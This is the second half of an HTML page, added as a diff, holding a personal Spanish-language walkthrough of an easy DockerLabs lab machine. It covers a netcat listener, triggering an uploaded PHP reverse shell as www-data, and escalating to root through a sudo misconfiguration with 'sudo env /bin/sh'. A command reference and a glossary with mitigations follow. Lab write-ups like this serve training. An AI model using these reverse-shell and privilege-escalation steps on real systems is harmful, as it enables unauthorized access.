+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">KALI</span>
+        <div><span class="prompt">└─$ </span><span class="cmd">sudo nc <span class="flag">-lvnp</span> <span class="arg">4444</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>listening on [any] <span class="o-yellow">4444</span> ...</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">6b</div>
+        <span class="step-title">ACTIVAR EL WEBSHELL — CLIC EN /uploads/revershell.php</span>
+      </div>
+
+      <div class="prose">
+        <p>
+          En el navegador, accedemos a <span class="hl-cyan">http://172.17.0.2/uploads/</span>, confirmamos que
+          <strong>revershell.php</strong> aparece en el directory listing, y hacemos clic en él.
+          Esto provoca que el servidor Apache ejecute el PHP, que abre una conexión TCP hacia nuestra máquina.
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div>listening on [any] <span class="o-yellow">4444</span> ...</div>
+        <div><span class="o-green">connect to [192.168.111.128] from (UNKNOWN) [172.17.0.2] 55452</span></div>
+        <div>Linux edee56e880d8 6.18.12+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.18.12-1kali1 (2026-02-25) x86_64 x86_64 x86_64 GNU/Linux</div>
+        <div>02:28:55 up 5:03, 0 users, load average: 1.34, 0.90, 0.44</div>
+        <div><span class="o-cyan">USER     TTY      FROM      LOGIN@   IDLE   JCPU   PCPU   WHAT</span></div>
+        <div>uid=<span class="o-yellow">33</span>(www-data) gid=<span class="o-yellow">33</span>(www-data) groups=<span class="o-yellow">33</span>(www-data)</div>
+        <div>sh: 0: can't access tty; job control turned off</div>
+        <div><span class="o-green">$ </span></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// SHELL OBTENIDA</p>
+        <p>Tenemos ejecución remota de comandos como <strong>www-data</strong>. Es una shell básica (sin TTY). Desde aquí procedemos a la escalada de privilegios.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ESCALADA DE PRIVILEGIOS -->
+    <div class="section" id="privesc">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Escalada de Privilegios</h2>
+      <div class="section-line"></div>
+
+      <div class="prose">
+        <p>
+          Con acceso como <span class="hl-blue">www-data</span>, el primer paso es verificar qué comandos
+          podemos ejecutar con <span class="hl">sudo</span> sin contraseña usando <code style="color:var(--yellow);font-family:var(--font-mono)">sudo -l</code>.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">VERIFICAR PERMISOS SUDO</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo -l">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">VICTIM</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo <span class="flag">-l</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Matching Defaults entries for www-data on edee56e880d8:</div>
+        <div>    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use_pty</div>
+        <div>&nbsp;</div>
+        <div>User www-data may run the following commands on edee56e880d8:</div>
+        <div>    (root) NOPASSWD: <span class="o-red">/usr/bin/env</span></div>
+      </div>
+
+      <div class="cve-box">
+        <p class="cve-box-title">// MISCONFIGURATION CRÍTICA</p>
+        <p>
+          El usuario <strong>www-data</strong> puede ejecutar <strong>/usr/bin/env</strong> como root <strong>sin contraseña (NOPASSWD)</strong>.
+          El binario <code>env</code> puede usarse para lanzar cualquier proceso — incluyendo una shell — con los privilegios del usuario que lo invoca.
+          Al ejecutarlo con <code>sudo</code>, ese usuario es <strong>root</strong>.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">8</div>
+        <span class="step-title">GTFOBINS — SUDO ENV PARA ESCALAR A ROOT</span>
+      </div>
+
+      <div class="prose">
+        <p>
+          Consultamos <span class="hl-cyan">GTFObins</span> (<code style="font-family:var(--font-mono);color:var(--yellow)">https://gtfobins.org/gtfobins/env/#shell</code>),
+          la base de datos de técnicas para abusar de binarios legítimos de Unix.
+          En la sección <span class="hl">Sudo</span> de <code>env</code> encontramos el vector exacto:
+        </p>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// GTFOBINS — ENV → SHELL</p>
+        <p>
+          <strong>env /bin/sh</strong><br>
+          This function is performed by the privileged user if executed via <code>sudo</code> because the acquired privileges are not dropped.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">9</div>
+        <span class="step-title">ESCALADA — sudo env /bin/sh</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo env /bin/sh">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">VICTIM</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo env <span class="arg">/bin/sh</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">$ </span>whoami</div>
+        <div><span class="o-red">root</span></div>
+      </div>
+
+      <div class="root-banner">
+        <div class="root-banner-title">ROOT OBTENIDO</div>
+        <div class="root-banner-sub">// www-data → sudo env /bin/sh → uid=0(root)</div>
+      </div>
+
+      <div class="prose">
+        <p>
+          Con una sola línea aprovechamos la misconfiguration de sudo para escalar de
+          <span class="hl-blue">www-data</span> a <span class="hl">root</span>.
+          El binario <code style="font-family:var(--font-mono);color:var(--yellow)">env</code> lanza
+          <code style="font-family:var(--font-mono);color:var(--yellow)">/bin/sh</code> heredando los
+          privilegios de root porque lo ejecutamos a través de <code style="font-family:var(--font-mono);color:var(--yellow)">sudo</code>.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- REFERENCIA -->
+    <div class="section" id="referencia">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Referencia de Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nmap</div>
+          <div class="cmd-ref-syntax">nmap -p- -sSCV -n -Pn --min-rate=5000 --open &lt;IP&gt; -oX out.xml</div>
+          <div class="cmd-ref-desc">Escaneo completo de todos los puertos TCP con detección de servicios, versiones y scripts NSE.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-p-</span> → Todos los 65,535 puertos</li>
+            <li><span>-sS</span> → SYN scan (sigiloso)</li>
+            <li><span>-sC</span> → Scripts de reconocimiento por defecto</li>
+            <li><span>-sV</span> → Detección de versión de servicios</li>
+            <li><span>--min-rate=5000</span> → Mínimo 5000 paquetes/seg</li>
+            <li><span>-oX</span> → Salida en formato XML</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">gobuster dir</div>
+          <div class="cmd-ref-syntax">gobuster dir -u &lt;URL&gt; -w &lt;wordlist&gt; -x php,html,sh,py</div>
+          <div class="cmd-ref-desc">Fuerza bruta de directorios y archivos en servidores web. Ideal para descubrir endpoints ocultos.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-u</span> → URL objetivo</li>
+            <li><span>-w</span> → Wordlist a usar</li>
+            <li><span>-x</span> → Extensiones a probar</li>
+            <li><span>-t</span> → Número de hilos (default 10)</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nc (Netcat)</div>
+          <div class="cmd-ref-syntax">sudo nc -lvnp &lt;puerto&gt;</div>
+          <div class="cmd-ref-desc">Abre un puerto de escucha para recibir conexiones entrantes de reverse shells.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-l</span> → Modo listener (escucha)</li>
+            <li><span>-v</span> → Verbose (muestra info de conexión)</li>
+            <li><span>-n</span> → No resolución DNS</li>
+            <li><span>-p</span> → Puerto a escuchar</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">sudo env /bin/sh</div>
+          <div class="cmd-ref-syntax">sudo env /bin/sh</div>
+          <div class="cmd-ref-desc">Abusa de sudo sobre /usr/bin/env para lanzar una shell como root. Técnica documentada en GTFObins.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>sudo -l</span> → Ver permisos sudo del usuario actual</li>
+            <li><span>env /bin/sh</span> → Lanza shell heredando privilegios</li>
+            <li><span>whoami</span> → Confirmar que somos root</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- GLOSARIO -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 07</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">Unrestricted File Upload</div>
+          <div class="glos-def"><strong>Unrestricted File Upload</strong> es una vulnerabilidad web donde el servidor permite subir archivos sin validar su tipo, extensión o contenido. Un atacante puede subir un <strong>webshell PHP</strong> (o en cualquier lenguaje ejecutado por el servidor) y luego acceder a él vía HTTP para ejecutar comandos en el sistema. Es parte del <strong>OWASP Top 10</strong> bajo la categoría A03:2021 — Injection. La mitigación incluye: validar el tipo MIME real, restringir extensiones, almacenar fuera del webroot, y renombrar archivos al subirlos.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Reverse Shell</div>
+          <div class="glos-def">Una <strong>reverse shell</strong> es una conexión donde la <em>máquina víctima</em> se conecta de vuelta hacia el <em>atacante</em>. Esto permite evadir firewalls que bloquean conexiones entrantes pero permiten las salientes. El atacante abre un listener (<code>nc -lvnp 4444</code>) y cuando el payload PHP se ejecuta, la víctima establece la conexión TCP. El resultado es una terminal de comandos interactiva en la máquina del atacante.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">PHP PentestMonkey Webshell</div>
+          <div class="glos-def">El <strong>php-reverse-shell de PentestMonkey</strong> es uno de los payloads PHP más usados en pentesting. Implementa una reverse shell completa en un único archivo PHP. Solo requiere configurar la IP (<code>$ip</code>) y el puerto (<code>$port</code>) del atacante. Al ejecutarse en el servidor, abre un socket TCP hacia el atacante y conecta stdin/stdout de <code>sh</code> a través de ese socket, dando acceso completo al shell del sistema. Disponible en <code>revshells.com</code>.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">www-data</div>
+          <div class="glos-def"><strong>www-data</strong> es el usuario de sistema bajo el cual corren servidores web como <strong>Apache</strong> y <strong>Nginx</strong> en sistemas Debian/Ubuntu. Tiene permisos muy limitados — solo puede leer/escribir los archivos del webroot (<code>/var/www/html/</code>) y directorios configurados. Es el punto de entrada habitual cuando se explota una vulnerabilidad web: el atacante obtiene una shell como www-data y desde ahí busca vectores de escalada de privilegios.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">sudo -l y Escalada de Privilegios</div>
+          <div class="glos-def"><code>sudo -l</code> lista los comandos que el usuario actual puede ejecutar como root (u otro usuario) sin necesidad de contraseña, según <code>/etc/sudoers</code>. La misconfiguration más común es permitir <strong>NOPASSWD</strong> en binarios que pueden lanzar shells, como <code>vim</code>, <code>python</code>, <code>env</code>, <code>find</code>, etc. Si www-data puede ejecutar cualquiera de estos con sudo, un atacante obtiene acceso root trivialmente.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">GTFObins — env</div>
+          <div class="glos-def"><strong>GTFObins</strong> es una base de datos de binarios Unix que pueden ser abusados para evadir restricciones de seguridad, como escalar privilegios o saltar jails. El binario <code>env</code> (GNU coreutils) ejecuta un programa en un entorno modificado. Cuando se ejecuta via <code>sudo env /bin/sh</code>, la shell resultante hereda los privilegios de root porque <code>sudo</code> no los descarta. El comando completo es simplemente: <code>sudo env /bin/sh</code> → shell como root.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Directory Listing</div>
+          <div class="glos-def"><strong>Directory Listing</strong> (o Directory Indexing) es una configuración del servidor web donde, al acceder a un directorio sin un archivo <code>index.html</code> o <code>index.php</code>, el servidor muestra una lista de todos los archivos contenidos. En el caso de esta máquina, <code>/uploads/</code> tenía directory listing habilitado, permitiendo al atacante ver el archivo <code>revershell.php</code> subido y hacer clic para ejecutarlo. Es una misconfiguration peligrosa que debe deshabilitarse en producción.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Gobuster</div>
+          <div class="glos-def"><strong>Gobuster</strong> es una herramienta de fuerza bruta para descubrir directorios, archivos, subdominios y vhosts en aplicaciones web. A diferencia de herramientas más lentas como DirBuster (Java), Gobuster está escrito en Go y es mucho más rápido. El modo <code>dir</code> es el más usado: prueba cada entrada de la wordlist como ruta en la URL objetivo y reporta los códigos de respuesta HTTP (200, 301, 403, etc.).</div>
+        </div>
+
+      </div>
+    </div>
+
+  </main>
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// CONTENIDO</p>
+      <ul class="toc-list">
+        <li><a href="#overview">01 · Overview</a></li>
+        <li><a href="#reconocimiento">02 · Reconocimiento</a></li>
+        <li><a href="#enumeracion">03 · Enumeración Web</a></li>
+        <li><a href="#explotacion">04 · Explotación</a></li>
+        <li><a href="#privesc">05 · Escalada de Privilegios</a></li>
+        <li><a href="#referencia">06 · Referencia</a></li>
+        <li><a href="#glosario">07 · Glosario</a></li>
+      </ul>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO</p>
+      <div class="info-row">
+        <span class="info-label">PLATAFORMA</span>
+        <span class="info-val val-green">DockerLabs</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">DIFICULTAD</span>
+        <span class="info-val val-facil">FÁCIL</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">OS</span>
+        <span class="info-val val-blue">Linux</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">PUERTO</span>
+        <span class="info-val val-yellow">80 (HTTP)</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">VECTOR</span>
+        <span class="info-val val-red">File Upload</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">PRIVESC</span>
+        <span class="info-val val-purple">sudo env</span>
+      </div>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ATTACK PATH</p>
+      <div class="attack-path">
+        <div class="ap-item">
+          <div class="ap-dot"></div>
+          <div class="ap-text"><span>Nmap</span> — Puerto 80 HTTP</div>
+        </div>
+        <div class="ap-line" style="margin-left:3.5px"></div>
+        <div class="ap-item">
+          <div class="ap-dot"></div>
+          <div class="ap-text"><span>Gobuster</span> — /uploads/</div>
+        </div>
+        <div class="ap-line" style="margin-left:3.5px"></div>
+        <div class="ap-item">
+          <div class="ap-dot"></div>
+          <div class="ap-text"><span>PHP Shell</span> — revershell.php</div>
+        </div>
+        <div class="ap-line" style="margin-left:3.5px"></div>
+        <div class="ap-item">
+          <div class="ap-dot"></div>
+          <div class="ap-text"><span>nc -lvnp 4444</span> — Listener</div>
+        </div>
+        <div class="ap-line" style="margin-left:3.5px"></div>
+        <div class="ap-item">
+          <div class="ap-dot"></div>
+          <div class="ap-text"><span>www-data</span> — Shell obtenida</div>
+        </div>
+        <div class="ap-line" style="margin-left:3.5px"></div>
+        <div class="ap-item">
+          <div class="ap-dot" style="background:var(--red);box-shadow:0 0 6px var(--red)"></div>
+          <div class="ap-text"><span style="color:var(--red)">sudo env /bin/sh</span> — ROOT</div>
+        </div>
+      </div>
+    </div>
+  </aside>
+
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · DockerLabs</p>
+  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
+</footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+  // CURSOR
+  const cursor = document.getElementById('cursor');
+  const ring   = document.getElementById('cursorRing');
+  document.addEventListener('mousemove', e => {
+    cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px';
+    ring.style.left   = e.clientX + 'px'; ring.style.top   = e.clientY + 'px';
+    cursor.style.opacity = '1'; ring.style.opacity = '0.5';
+  });
+  document.addEventListener('mousedown', () => { cursor.style.transform = 'translate(-50%,-50%) scale(0.5)'; });
+  document.addEventListener('mouseup',   () => { cursor.style.transform = 'translate(-50%,-50%)'; });
+  document.querySelectorAll('a, button').forEach(el => {
+    el.addEventListener('mouseenter', () => { ring.style.width = '54px'; ring.style.height = '54px'; ring.style.opacity = '0.3'; });
+    el.addEventListener('mouseleave', () => { ring.style.width = '36px'; ring.style.height = '36px'; ring.style.opacity = '0.5'; });
+  });
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+</body>
+</html>
